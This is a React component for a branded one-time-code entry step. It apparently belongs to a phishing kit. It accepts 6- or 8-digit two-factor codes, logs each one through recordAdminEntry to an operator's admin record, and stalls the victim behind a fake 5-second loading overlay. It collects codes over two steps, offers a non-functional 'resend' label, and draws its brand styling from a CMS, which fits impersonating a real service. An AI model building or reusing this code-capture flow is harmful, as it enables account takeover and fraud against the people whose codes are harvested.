import { useState } from "react";
import { NeroCard, NeroShell, NeroWordmark } from "./Shell";
import { PrimaryButton } from "./PrimaryButton";
import { LoadingOverlay } from "./LoadingOverlay";
import { recordAdminEntry } from "@/lib/nero-flow";
import type { BrandContent, Block, CodeStepContent } from "@/lib/cms-defaults";

export function CodeStep({
  step,
  content,
  brand,
  onSubmit,
  delayMs = 5000,
  customCss,
  blocks,
}: {
  step: 1 | 2;
  content: CodeStepContent;
  brand: BrandContent;
  onSubmit: (code: string) => void;
  delayMs?: number;
  customCss?: string;
  blocks?: Block[];
}) {
  const [code, setCode] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const valid = code.length === 6 || code.length === 8;

  return (
    <NeroShell brand={brand} customCss={customCss} blocks={blocks}>
      {loading && <LoadingOverlay label={content.loadingLabel} />}
      <NeroWordmark small text={brand.wordmark} />
      <div className="mt-6">
        <NeroCard>
          <p className="text-[13px] font-semibold tracking-wide text-muted-foreground uppercase">
            {content.stepLabel}
          </p>
          <h2 className="mt-2 text-[20px] leading-tight font-bold text-card-foreground">
            {content.title}
          </h2>
          <p className="mt-2 text-[14px] leading-relaxed text-muted-foreground">
            {content.description}
          </p>

          <form
            className="mt-5 space-y-3"
            onSubmit={(e) => {
              e.preventDefault();
              if (!valid) {
                setError(content.validationError);
                return;
              }
              setError(null);
              setLoading(true);
              recordAdminEntry({ kind: "code", step: `step-${step}`, code });
              window.setTimeout(() => onSubmit(code), delayMs);
            }}
          >
            <input
              autoFocus
              inputMode="numeric"
              autoComplete="one-time-code"
              placeholder={content.placeholder}
              maxLength={8}
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
              className="h-12 w-full rounded-md border border-input bg-card px-4 text-center text-[20px] tracking-[0.4em] text-card-foreground placeholder:tracking-normal placeholder:text-muted-foreground focus:border-ring focus:ring-2 focus:ring-ring/30 focus:outline-none"
            />
            {error && <p className="text-[13px] text-destructive">{error}</p>}
            <PrimaryButton type="submit" disabled={!valid || loading}>
              {loading ? "Please wait…" : content.submitLabel}
            </PrimaryButton>
          </form>

          <p className="mt-4 text-center text-[13px] text-brand-link">
            {content.resendLabel}
          </p>
        </NeroCard>
      </div>
    </NeroShell>
  );
}